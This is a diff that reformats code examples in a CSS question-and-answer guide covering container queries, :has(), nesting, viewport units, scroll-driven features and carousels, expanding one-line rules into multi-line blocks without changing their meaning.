@@ -5483,12 +6318,20 @@ With `container-type: size`, the container can't get its height from its childre
 Style queries can react to a custom property set by a parent, without adding classes to every child.
 
 ```css
-.card { --tone: neutral; }
-.card[data-tone="warning"] { --tone: warning; }
+.card {
+  --tone: neutral;
+}
+.card[data-tone="warning"] {
+  --tone: warning;
+}
 
 @container style(--tone: warning) {
-  .card__icon { color: darkorange; }
-  .card__title::before { content: "⚠ "; }
+  .card__icon {
+    color: darkorange;
+  }
+  .card__title::before {
+    content: "⚠ ";
+  }
 }
 ```
 
@@ -5498,16 +6341,24 @@ This works well for themes and for passing context down, like "this button is in
 
 ```css
 /* show a "has errors" state on the form */
-form:has(:user-invalid) .submit { opacity: 0.5; }
+form:has(:user-invalid) .submit {
+  opacity: 0.5;
+}
 
 /* card is clickable if it contains a primary link */
-.card:has(a.primary) { cursor: pointer; }
+.card:has(a.primary) {
+  cursor: pointer;
+}
 
 /* change layout when a sidebar exists */
-.layout:has(> .sidebar) { grid-template-columns: 250px 1fr; }
+.layout:has(> .sidebar) {
+  grid-template-columns: 250px 1fr;
+}
 
 /* style the previous sibling */
-li:has(+ li:hover) { scale: 1.05; }
+li:has(+ li:hover) {
+  scale: 1.05;
+}
 ```
 
 Pitfalls:
@@ -5522,8 +6373,11 @@ Pitfalls:
 Nested rules act like the parent selector is wrapped in `:is()`. If the parent is a selector list with different specificities, every nested rule gets the **highest** one.
 
 ```css
-.button, #legacy-button {
-  & span { color: red; }
+.button,
+#legacy-button {
+  & span {
+    color: red;
+  }
 }
 /* same as :is(.button, #legacy-button) span → specificity (1,0,1) for both */
 ```
@@ -5536,10 +6390,16 @@ Now a `.button span` override elsewhere (0,1,1) loses even for normal buttons. S
 
 ```css
 .card {
-  .theme-dark & { background: #111; }  /* .theme-dark .card */
-  & & { margin: 0; }                   /* .card .card (nested cards) */
-  &--compact { }                       /* does NOT mean .card--compact */
-  :hover > & { }                       /* :hover > .card */
+  .theme-dark & {
+    background: #111;
+  } /* .theme-dark .card */
+  & & {
+    margin: 0;
+  } /* .card .card (nested cards) */
+  &--compact {
+  } /* does NOT mean .card--compact */
+  :hover > & {
+  } /* :hover > .card */
 }
 ```
 
@@ -5552,7 +6412,8 @@ Things to watch:
 ### 393: How do `@import` with `layer()`, `supports()` and media conditions work together?
 
 ```css
-@import url("theme.css") layer(theme) supports(color: oklch(0 0 0)) (prefers-color-scheme: dark);
+@import url("theme.css") layer(theme) supports(color: oklch(0 0 0))
+  (prefers-color-scheme: dark);
 ```
 
 Order matters: URL, then `layer`, then `supports()`, then media queries. The file is loaded as part of layer `theme` only if the browser supports `oklch` and the media query matches. An anonymous `layer` with no name puts it in its own unnamed layer.
@@ -5604,7 +6465,9 @@ It sets how an animation's value combines with the element's underlying value, o
   animation-composition: add; /* keeps the 10deg rotation while nudging */
 }
 @keyframes nudge {
-  50% { transform: translateX(5px); }
+  50% {
+    transform: translateX(5px);
+  }
 }
 ```
 
@@ -5621,8 +6484,12 @@ It's Baseline since 2023.
   animation: travel 3s ease-in-out infinite alternate;
 }
 @keyframes travel {
-  from { offset-distance: 0%; }
-  to   { offset-distance: 100%; }
+  from {
+    offset-distance: 0%;
+  }
+  to {
+    offset-distance: 100%;
+  }
 }
 ```
 
@@ -5640,7 +6507,9 @@ They let CSS react to scroll-related state of a container, like whether a sticky
 }
 
 @container scroll-state(stuck: top) {
-  .header-inner { box-shadow: 0 2px 8px rgb(0 0 0 / 15%); }
+  .header-inner {
+    box-shadow: 0 2px 8px rgb(0 0 0 / 15%);
+  }
 }
 ```
 
@@ -5651,7 +6520,9 @@ Before this, you needed an `IntersectionObserver` with a sentinel element to det
 When content above the visible area changes size (like images or ads loading), browsers adjust the scroll position so the content the user is reading doesn't jump. This is scroll anchoring, and it's on by default in Chromium and Firefox. Safari support came later, so check caniuse if you rely on it.
 
 ```css
-.chat-log { overflow-anchor: none; } /* turn it off where you manage scroll yourself */
+.chat-log {
+  overflow-anchor: none;
+} /* turn it off where you manage scroll yourself */
 ```
 
 Turn it off for chat windows or infinite feeds where your own code controls scroll position, otherwise the two can fight.
@@ -5711,10 +6582,16 @@ The middle value comes from the line between the two points: `slope = (max - min
     content: "Page " counter(page) " of " counter(pages);
   }
 }
-@page :first { margin-top: 4cm; }
-@page landscape-table { size: A4 landscape; }
+@page :first {
+  margin-top: 4cm;
+}
+@page landscape-table {
+  size: A4 landscape;
+}
 
-.wide-table { page: landscape-table; }
+.wide-table {
+  page: landscape-table;
+}
 ```
 
 Margin boxes (`@top-center`, `@bottom-right` and so on) and named pages are newer in browsers. Chromium supports them, and other browsers have less support. Tools like Paged.js or PDF engines (Prince, WeasyPrint) support them fully, so complex PDF reports are often built with HTML and CSS through those tools.
@@ -5762,8 +6639,8 @@ if (CSS.supports("anchor-name", "--a")) {
   // load a positioning library
 }
 
-CSS.supports("display: grid");               // single string form
-CSS.supports("selector(:has(a))");           // selectors
+CSS.supports("display: grid"); // single string form
+CSS.supports("selector(:has(a))"); // selectors
 ```
 
 `CSS.supports()` uses the same parser as `@supports`. It checks if the browser **parses** the value, not if the feature fully works. A browser could parse a property but have bugs in it.
@@ -5774,10 +6651,14 @@ It checks if a selector is supported, so you can use new selectors safely:
 
 ```css
 /* fallback: JS adds .has-image */
-.card.has-image { padding: 0; }
+.card.has-image {
+  padding: 0;
+}
 
 @supports selector(:has(img)) {
-  .card:has(img) { padding: 0; }
+  .card:has(img) {
+    padding: 0;
+  }
 }
 ```
 
@@ -5789,7 +6670,8 @@ This matters because an unsupported selector in a list makes the whole rule inva
 
 ```js
 [...document.querySelectorAll("*")].filter(
-  (el) => el.getBoundingClientRect().right > document.documentElement.clientWidth
+  (el) =>
+    el.getBoundingClientRect().right > document.documentElement.clientWidth,
 );
 ```
 
@@ -5803,8 +6685,8 @@ On mobile browsers, `100vh` equals the **largest** viewport (with toolbars hidde
 
 ```css
 .hero {
-  min-height: 100vh;   /* fallback */
-  min-height: 100svh;  /* fits the smallest visible viewport */
+  min-height: 100vh; /* fallback */
+  min-height: 100svh; /* fits the smallest visible viewport */
 }
 ```
 
@@ -5816,9 +6698,14 @@ On touch screens, a tap triggers `:hover`, and it can stay until the user taps s
 
 ```css
 @media (hover: hover) and (pointer: fine) {
-  .card:hover { translate: 0 -4px; box-shadow: var(--shadow-lg); }
+  .card:hover {
+    translate: 0 -4px;
+    box-shadow: var(--shadow-lg);
+  }
 }
-.card:active { scale: 0.98; } /* feedback for touch */
+.card:active {
+  scale: 0.98;
+} /* feedback for touch */
 ```
 
 Never put essential actions behind hover only. Make sure there's always a visible or focusable way to reach them.
@@ -5878,7 +6765,9 @@ Older approaches added padding equal to the scrollbar width with JavaScript. `sc
 
 ```css
 @media (prefers-color-scheme: dark) {
-  img:not([src$=".svg"]) { filter: brightness(0.9); }
+  img:not([src$=".svg"]) {
+    filter: brightness(0.9);
+  }
 }
 ```
 
@@ -5914,9 +6803,15 @@ Options, from simple to complex:
 1. **Horizontal scroll**: wrap it with `overflow-x: auto`, and make the first column sticky. Simple, and it keeps the table's meaning.
 
 ```css
-.table-scroll { overflow-x: auto; }
+.table-scroll {
+  overflow-x: auto;
+}
 .table-scroll th:first-child,
-.table-scroll td:first-child { position: sticky; left: 0; background: var(--bg); }
+.table-scroll td:first-child {
+  position: sticky;
+  left: 0;
+  background: var(--bg);
+}
 ```
 
 2. **Stacked cards**: on small screens, show each row as a block and use `data-label` with `::before` for column names. This breaks the table semantics if you change `display` on table elements, so add ARIA roles back (`role="table"`, `role="row"`, `role="cell"`).
@@ -5938,8 +6833,15 @@ Option 1 is usually the best default.
   flex-wrap: wrap;
   gap: 1rem;
 }
-.with-sidebar > .sidebar { flex-basis: 16rem; flex-grow: 1; }
-.with-sidebar > .main { flex-basis: 0; flex-grow: 999; min-width: 60%; }
+.with-sidebar > .sidebar {
+  flex-basis: 16rem;
+  flex-grow: 1;
+}
+.with-sidebar > .main {
+  flex-basis: 0;
+  flex-grow: 999;
+  min-width: 60%;
+}
 ```
 
 The second pattern (from "Every Layout") puts the sidebar above the main content when the main area would get narrower than 60%. Both use `minmax(0, …)` or `min-width` to stop wide content from making tracks wider than planned.
@@ -5971,8 +6873,13 @@ Option 1 is the modern answer.
 - **Newer units**: `1cap` (cap height) and `1lh` (line height) help size icons to match capital letters or to sit exactly on one line.
 
 ```css
-.icon { height: 1cap; width: auto; }
-.list-item::before { height: 1lh; }
+.icon {
+  height: 1cap;
+  width: auto;
+}
+.list-item::before {
+  height: 1lh;
+}
 ```
 
 Using `em` and `cap` keeps icons aligned when font size changes.
@@ -5985,9 +6892,15 @@ Using `em` and `cap` keeps icons aligned when font size changes.
 - Root versions also exist for other font units: `rem`, `rcap`, `rch`, `rex`, `ric`.
 
 ```css
-textarea { min-height: 3lh; }               /* exactly three lines */
-.prose > * + * { margin-top: 1rlh; }        /* vertical rhythm */
-.badge { height: 1cap; }
+textarea {
+  min-height: 3lh;
+} /* exactly three lines */
+.prose > * + * {
+  margin-top: 1rlh;
+} /* vertical rhythm */
+.badge {
+  height: 1cap;
+}
 ```
 
 `lh` and `rlh` are Baseline since 2023. `cap` and the other root font units are newer.
@@ -5999,7 +6912,10 @@ textarea { min-height: 3lh; }               /* exactly three lines */
 - The viewport meta key `interactive-widget=resizes-content` makes the layout viewport shrink instead (Chromium and Firefox), so `dvh` and fixed elements adjust.
 
 ```html
-<meta name="viewport" content="width=device-width, initial-scale=1, interactive-widget=resizes-content">
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, interactive-widget=resizes-content"
+/>
 ```
 
 The JavaScript `visualViewport` API gives exact sizes when CSS isn't enough.
@@ -6009,7 +6925,9 @@ The JavaScript `visualViewport` API gives exact sizes when CSS isn't enough.
 `zoom` scales an element **and** its layout space. `transform: scale()` only scales it visually, while the original space stays the same. It used to be non-standard (old IE and WebKit), but it was standardized and Firefox added it in 2024, so it now works in all major browsers.
 
 ```css
-.preview { zoom: 0.5; }   /* takes half the space, unlike scale(0.5) */
+.preview {
+  zoom: 0.5;
+} /* takes half the space, unlike scale(0.5) */
 ```
 
 It's handy for thumbnails and previews. Be careful: it affects all lengths inside, and how it interacts with things like `getBoundingClientRect()` was cleaned up only recently.
@@ -6121,15 +7039,20 @@ Use these instead of hacks, because they come with keyboard support and correct 
 In Chromium you can use a scroll-state container query (see question 399). For all browsers:
 
 ```css
-.header { position: sticky; top: -1px; }
-.header.is-stuck { box-shadow: 0 2px 8px rgb(0 0 0 / 15%); }
+.header {
+  position: sticky;
+  top: -1px;
+}
+.header.is-stuck {
+  box-shadow: 0 2px 8px rgb(0 0 0 / 15%);
+}
 ```
 
 ```js
 const header = document.querySelector(".header");
 new IntersectionObserver(
   ([entry]) => header.classList.toggle("is-stuck", entry.intersectionRatio < 1),
-  { threshold: [1] }
+  { threshold: [1] },
 ).observe(header);
 ```
 
@@ -6143,7 +7066,9 @@ When an element is first rendered (inserted, or changed from `display: none`), t
 .list-item {
   opacity: 1;
   translate: 0 0;
-  transition: opacity 250ms, translate 250ms;
+  transition:
+    opacity 250ms,
+    translate 250ms;
 
   @starting-style {
     opacity: 0;
@@ -6186,8 +7111,12 @@ They are state pseudo-classes for elements that open and close:
 - `:modal`: matches a dialog opened with `showModal()` or an element in fullscreen. It's useful because a dialog opened with `show()` is also `[open]` but isn't modal.
 
 ```css
-dialog:modal { box-shadow: 0 30px 80px rgb(0 0 0 / 40%); }
-details:is([open], :open) > summary { font-weight: bold; }
+dialog:modal {
+  box-shadow: 0 30px 80px rgb(0 0 0 / 40%);
+}
+details:is([open], :open) > summary {
+  font-weight: bold;
+}
 ```
 
 ### 440: What is the `reading-flow` property?
@@ -6257,14 +7186,30 @@ Scroll snap gives the motion. Newer Chromium features add controls:
   scroll-snap-type: x mandatory;
   overscroll-behavior-x: contain;
 }
-.carousel > * { scroll-snap-align: center; }
+.carousel > * {
+  scroll-snap-align: center;
+}
 
 /* Chromium: generated arrow buttons and dots */
-.carousel { scroll-marker-group: after; }
-.carousel::scroll-button(right) { content: "→" / "Next"; }
-.carousel::scroll-button(left)  { content: "←" / "Previous"; }
-.carousel > *::scroll-marker { content: ""; width: 10px; height: 10px; border-radius: 50%; background: gray; }
-.carousel > *::scroll-marker:target-current { background: black; }
+.carousel {
+  scroll-marker-group: after;
+}
+.carousel::scroll-button(right) {
+  content: "→" / "Next";
+}
+.carousel::scroll-button(left) {
+  content: "←" / "Previous";
+}
+.carousel > *::scroll-marker {
+  content: "";
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: gray;
+}
+.carousel > *::scroll-marker:target-current {
+  background: black;
+}
 ```
 
 `::scroll-button()` and `::scroll-marker` are Chromium-only so far, so other browsers get the scroll-snap carousel without buttons. Keep each slide reachable by keyboard and give the region an accessible label (`role="region"` and `aria-label`).
@@ -6299,7 +7244,9 @@ Unregistered custom properties are strings, so a transition on them jumps at the
   background: conic-gradient(#4f46e5 var(--progress), #e5e7eb 0);
   transition: --progress 600ms ease-out;
 }
-.ring[data-value="75"] { --progress: 75%; }
+.ring[data-value="75"] {
+  --progress: 75%;
+}
 ```
 
 Then everything that uses the property animates, even things that can't be animated directly, like gradient stops.
@@ -6336,4 +7283,3 @@ CSS can do a lot now, but some things belong elsewhere:
 - **Security**. Hiding something with CSS doesn't protect it. It's still in the HTML.
 
 A good rule is to use the right layer: HTML for structure and meaning, CSS for presentation and simple visual states, and JavaScript for behavior and data.
-
